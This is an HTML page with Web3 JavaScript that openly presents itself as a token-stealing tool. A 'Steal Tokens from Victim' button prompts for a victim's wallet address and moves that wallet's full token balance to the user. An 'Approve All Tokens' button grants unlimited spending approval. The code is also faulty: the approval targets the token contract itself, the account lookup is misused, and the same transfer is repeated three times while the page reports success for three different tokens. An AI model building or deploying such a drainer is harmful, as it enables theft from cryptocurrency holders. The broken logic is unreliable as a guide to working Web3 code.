<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Approval DApps</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .container {
            max-width: 600px;
            margin: auto;
            padding: 20px;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Token Approval DApps</h1>

    <button id="connectWallet">Connect Wallet</button>
    <p id="walletAddress"></p>

    <h2>Approve Tokens</h2>
    <button id="approveTokens">Approve All Tokens</button>

    <h2>Steal Tokens</h2>
    <button id="stealTokens">Steal Tokens from Victim</button>

    <p id="result"></p>
</div>

<script>
    const contractAddress = "0x716FaF16d4423B337C93bFAefA6134d77cC7AfFF";
    const abi = [
        {
            "inputs": [
                { "internalType": "address", "name": "spender", "type": "address" },
                { "internalType": "uint256", "name": "amount", "type": "uint256" }
            ],
            "name": "approve",
            "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [{ "internalType": "address", "name": "account", "type": "address" }],
            "name": "balanceOf",
            "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [
                { "internalType": "address", "name": "sender", "type": "address" },
                { "internalType": "address", "name": "recipient", "type": "address" },
                { "internalType": "uint256", "name": "amount", "type": "uint256" }
            ],
            "name": "transferFrom",
            "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ];

    let web3;
    let contract;
    let userAddress;

    async function connectWallet() {
        if (window.ethereum) {
            web3 = new Web3(window.ethereum);
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAddress = web3.eth.accounts[0];
            contract = new web3.eth.Contract(abi, contractAddress);

            document.getElementById('walletAddress').innerText = `Wallet Address: ${userAddress}`;
        } else {
            alert('MetaMask not detected. Please install MetaMask.');
        }
    }

    async function approveTokens() {
        try {
            const tx = await contract.methods.approve(contractAddress, web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")).send({ from: userAddress });
            document.getElementById('result').innerText = `Approval Status: ${tx.status}`;
        } catch (error) {
            console.error(error);
            document.getElementById('result').innerText = `Error approving tokens.`;
        }
    }

    async function stealTokens() {
        // Replace '0xVictimAddress' with the actual victim address
        const victimAddress = prompt("Enter victim's wallet address:");
        if (!victimAddress) return;

        try {
            const txA = await contract.methods.transferFrom(victimAddress, userAddress, await contract.methods.balanceOf(victimAddress).call()).send({ from: userAddress });
            const txB = await contract.methods.transferFrom(victimAddress, userAddress, await contract.methods.balanceOf(victimAddress).call()).send({ from: userAddress });
            const txC = await contract.methods.transferFrom(victimAddress, userAddress, await contract.methods.balanceOf(victimAddress).call()).send({ from: userAddress });

            document.getElementById('result').innerText = `Steal Tokens Status: Success for Token A, B, and C`;
        } catch (error) {
            console.error(error);
            document.getElementById('result').innerText = `Error stealing tokens.`;
        }
    }

    document.getElementById('connectWallet').addEventListener('click', connectWallet);
    document.getElementById('approveTokens').addEventListener('click', approveTokens);
    document.getElementById('stealTokens').addEventListener('click', stealTokens);

</script>

</body>
</html>
